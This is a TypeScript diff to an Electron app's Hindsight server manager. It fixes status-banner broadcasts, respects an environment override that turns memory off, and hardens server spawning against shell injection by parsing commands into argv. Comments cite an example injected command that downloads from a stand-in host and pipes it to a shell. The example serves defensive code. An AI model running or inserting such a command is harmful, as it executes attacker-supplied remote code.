@@ -113,6 +113,16 @@ export class HindsightManager {
    * (best-effort).
    */
   private broadcastStatus(state: 'spawning' | 'ready' | 'unreachable' | 'spawn-failed' | 'auth-failed', reason?: string): void {
+    // Keep the availability cache consistent with the broadcast. A terminal failure state
+    // ('spawn-failed' / 'unreachable') means the server is NOT usable — pin lastHealthy
+    // false + stamp lastCheckedAt so isAvailable() returns the cached false instead of its
+    // optimistic-true cold-start path (which, after start() early-returns or a failed
+    // spawn, would otherwise fire a wasted 800ms recall probe per answer at a server we
+    // already know is down). 'spawning' leaves the cache alone (poll loop owns it).
+    if (state === 'spawn-failed' || state === 'unreachable') {
+      this.lastHealthy = false;
+      this.lastCheckedAt = Date.now();
+    }
     try {
       const { BrowserWindow } = require('electron') as typeof import('electron');
       const payload = { state, reason: reason || undefined, logPath: this.logPath || undefined, at: Date.now() };
@@ -213,25 +223,33 @@ export class HindsightManager {
         console.warn(`[HindsightManager] healthCheck returned ${res.status} — Cloud key may be rejected`);
         return false;
       }
-      // A successful or 5xx response clears any prior auth-failure cache.
+      // Clear any prior auth-failure cache on a non-auth response (2xx or 5xx — both mean
+      // "auth was accepted, the endpoint is reachable").
       if (this.lastAuthFailedAt) {
         this.lastAuthFailedAt = 0;
-        // CRITICAL — if we WERE in the auth-failed state and the user just fixed their
-        // key, the top-of-overlay banner won't clear on its own (banner only clears
-        // on explicit 'ready' events). Broadcast 'ready' so the user gets immediate
-        // visual confirmation their fix worked. Only fires on the transition from
-        // failed → healthy, not on every healthy probe (avoids banner churn).
-        this.broadcastStatus('ready');
+        // The top-of-overlay banner only clears on explicit lifecycle events. Surface the
+        // recovery so the user gets immediate visual confirmation their fix worked. Fire
+        // the precise state: a 2xx → 'ready' (server is good); a 5xx → 'unreachable'
+        // (auth accepted but server erroring) so the banner copy + "View log" affordance
+        // matches reality instead of staying on the misleading "Cloud key rejected".
+        this.broadcastStatus(res.ok ? 'ready' : 'unreachable',
+          res.ok ? undefined : `server error (HTTP ${res.status})`);
       }
       return res.ok;
     } catch {
+      const wasAuthFailed = this.lastAuthFailedAt > 0;
       this.lastHealthy = false;
       this.lastCheckedAt = Date.now();
-      // CRITICAL — a network error is categorically different from an auth rejection.
-      // Clear the auth-failure cache too, otherwise `isAuthFailed()` keeps returning
-      // true for the full 5-min TTL and the user sees "Cloud key rejected" even
-      // when the real problem is "server unreachable".
-      if (this.lastAuthFailedAt) this.lastAuthFailedAt = 0;
+      // A network error is categorically different from an auth rejection. Clear the
+      // auth-failure cache, otherwise `isAuthFailed()` keeps returning true for the full
+      // 5-min TTL and the user sees "Cloud key rejected" even when the real problem is
+      // "server unreachable". If we WERE showing the auth-failed banner, transition it to
+      // 'unreachable' so the stale red "Cloud key rejected" copy doesn't linger — the
+      // banner state machine only updates on broadcasts, never on its own.
+      if (wasAuthFailed) {
+        this.lastAuthFailedAt = 0;
+        this.broadcastStatus('unreachable', 'server unreachable');
+      }
       return false;
     }
   }
@@ -316,6 +334,23 @@ export class HindsightManager {
         return !isIntelligenceFlagEnabled('hindsightMemory');
       }
       return false;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * True when the `hindsightMemory` flag is FORCED by an env override
+   * (`NATIVELY_HINDSIGHT_MEMORY` set to a recognized on/off value). Env writes no
+   * SettingsManager state, so `hindsightMemoryExplicitlyOff()` can't see it — this
+   * helper covers the gap. The auto-flip must skip when the env forces the value in
+   * EITHER direction: forcing OFF must not be silently overwritten with a persisted ON,
+   * and forcing ON means the flip is already unnecessary. Never throws.
+   */
+  private memoryFlagEnvForced(): boolean {
+    try {
+      const { isIntelligenceFlagEnvForced } = require('../intelligence/intelligenceFlags');
+      return Boolean(isIntelligenceFlagEnvForced('hindsightMemory'));
     } catch {
       return false;
     }
@@ -482,16 +517,25 @@ export class HindsightManager {
       // "enable memory for this session": idempotently flip the flag ON here so the
       // gate passes.
       //
-      // RESPECT USER-OFF INTENT — the auto-flip only fires when `hindsightMemory` is
-      // at its registry default OR was last touched at the default. The sibling
-      // `hindsightMemoryEnabledExplicit` is set by `setIntelligenceFlag` whenever the
-      // value DIFFERS from default. A user (or env override like
-      // `NATIVELY_HINDSIGHT_MEMORY=0`) who explicitly disabled the flag leaves the
-      // sibling `true`, and the auto-flip below SKIPS. Without this guard, every
-      // debounced Settings save (every keystroke after the field was touched) would
-      // silently flip the flag back ON — and the Customize disclosure intentionally
-      // HIDES Hindsight flags, so the user has no UI to re-disable.
-      if (!this.memoryFlagOn() && this.isAutoStartEnabled() && !this.hindsightMemoryExplicitlyOff()) {
+      // RESPECT USER-OFF INTENT — two independent ways the user can say "off", both of
+      // which the auto-flip must honor:
+      //   (1) UI/settings: `setIntelligenceFlag` writes the sibling
+      //       `hindsightMemoryEnabledExplicit=true` whenever the value DIFFERS from the
+      //       registry default → `hindsightMemoryExplicitlyOff()` returns true → skip.
+      //   (2) Env override: `NATIVELY_HINDSIGHT_MEMORY=0` writes NO SettingsManager state,
+      //       so the sibling check alone can't see it. `isIntelligenceFlagEnvForced`
+      //       detects it. CRITICAL: without this, the auto-flip would write
+      //       `hindsightMemoryEnabled=true` to settings while env=0 wins at read time —
+      //       looks fine until the user unsets the env, at which point memory silently
+      //       turns ON against the user's stated "always off" intent.
+      // Either signal blocks the flip. The Customize disclosure intentionally HIDES the
+      // Hindsight flags, so a wrong flip leaves the user no UI to re-disable.
+      if (
+        !this.memoryFlagOn() &&
+        this.isAutoStartEnabled() &&
+        !this.hindsightMemoryExplicitlyOff() &&
+        !this.memoryFlagEnvForced()
+      ) {
         try {
           const { setIntelligenceFlag } = require('../intelligence/intelligenceFlags');
           // `setIntelligenceFlag` returns boolean (false = key rejected by registry guard,
@@ -676,11 +720,65 @@ export class HindsightManager {
 
   /** Spawn the configured server command (shell form, like `bash scripts/hindsight-start.sh`).
    *  Degrades gracefully on error ("python/script not found") — app unaffected. */
+  /**
+   * Parse a command string into argv WITHOUT a shell — handles double-quoted segments
+   * (for the bundled launcher path which may contain spaces, e.g. "Application Support")
+   * and rejects shell metacharacters that would enable injection. Returns null when the
+   * command contains metacharacters outside quotes (caller must refuse to spawn unless
+   * HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is set). Supports the two real forms:
+   *   • `bash "/abs path/scripts/hindsight-start.sh"`  → ['bash', '/abs path/.../start.sh']
+   *   • `my-launcher --foo bar`                        → ['my-launcher', '--foo', 'bar']
+   * Rejects `bash x; curl evil | sh`, `$(...)`, backticks, `&&`, `|`, `>`, `<`, newlines.
+   */
+  private parseCommandToArgv(command: string): string[] | null {
+    // Reject obvious shell metacharacters anywhere outside of double quotes. We scan
+    // char-by-char tracking quote state; a metachar seen while NOT inside quotes → reject.
+    const META = new Set([';', '|', '&', '$', '`', '>', '<', '(', ')', '\n', '\r', '{', '}', '*', '?', '~', '!', '#', '\\']);
+    const argv: string[] = [];
+    let cur = '';
+    let inQuote = false;
+    let sawToken = false;
+    for (let i = 0; i < command.length; i++) {
+      const c = command[i];
+      if (inQuote) {
+        if (c === '"') { inQuote = false; }
+        else { cur += c; }
+        continue;
+      }
+      if (c === '"') { inQuote = true; sawToken = true; continue; }
+      if (c === ' ' || c === '\t') {
+        if (sawToken) { argv.push(cur); cur = ''; sawToken = false; }
+        continue;
+      }
+      if (META.has(c)) return null; // metachar outside quotes → unsafe
+      cur += c; sawToken = true;
+    }
+    if (inQuote) return null;          // unterminated quote → malformed
+    if (sawToken) argv.push(cur);
+    return argv.length ? argv : null;
+  }
+
   private spawnServer(command: string): void {
     try {
       const { spawn } = require('child_process') as typeof import('child_process');
+      // SHELL-INJECTION HARDENING — `command` can come from a persisted
+      // `hindsightServerCommand` setting (writable by any code that can reach
+      // SettingsManager). Running it via `shell: true` would execute embedded
+      // metacharacters (`bash x; curl evil | sh`) on every auto-start → RCE on launch.
+      // Default: parse into argv and spawn with shell:false (no shell interpretation).
+      // Escape hatch: HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true restores the legacy
+      // shell behavior for power users who genuinely need a shell one-liner.
+      const allowShell = String(process.env.HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL || '').toLowerCase() === 'true';
+      let argv: string[] | null = null;
+      if (!allowShell) {
+        argv = this.parseCommandToArgv(command);
+        if (!argv) {
+          console.error('[HindsightManager] refusing to spawn — command contains shell metacharacters and HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is not set:', command);
+          this.broadcastStatus('spawn-failed', 'launch command rejected (contains shell metacharacters)');
+          return;
+        }
+      }
       this.isAppManaged = true;
-      // Shell form so a multi-token command (`bash scripts/...`) works cross-platform.
       // detached:true on POSIX puts the server in its OWN process group, so on quit we can
       // synchronously kill the WHOLE tree (Python + embedded Postgres workers, which
       // re-parent/daemonize) with one `process.kill(-pid)` inside before-quit — tree-kill
@@ -720,8 +818,7 @@ export class HindsightManager {
       const cfg = this.getHindsightConfig();
       const credsEnv = (cfg && !isLocalTarget(cfg.baseUrl)) ? {} : this.buildCredentialEnv();
 
-      this.serverProcess = spawn(command, {
-        shell: true,
+      const spawnOpts = {
         detached: !isWin,   // own process group on POSIX for group-kill on quit
         windowsHide: true,
         stdio,
@@ -731,7 +828,13 @@ export class HindsightManager {
         // script (hindsight-start.sh) picks these up and builds the litellm router.
         // augmentPath() fixes the Finder-launch minimal-PATH caveat (python3 not found).
         env: { ...process.env, PATH: this.augmentPath(), ...credsEnv },
-      });
+      };
+      this.serverProcess = allowShell
+        // Legacy shell form (opt-in via HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true).
+        ? spawn(command, { ...spawnOpts, shell: true })
+        // Default safe form — argv[0] + args, NO shell interpretation. argv is non-null
+        // here (we returned early above if parseCommandToArgv failed).
+        : spawn(argv![0], argv!.slice(1), { ...spawnOpts, shell: false });
       // The parent no longer needs the fd once the child owns it.
       if (outFd !== null) { try { require('fs').closeSync(outFd); } catch { /* noop */ } }
       // Don't let the detached child keep the parent event loop alive.
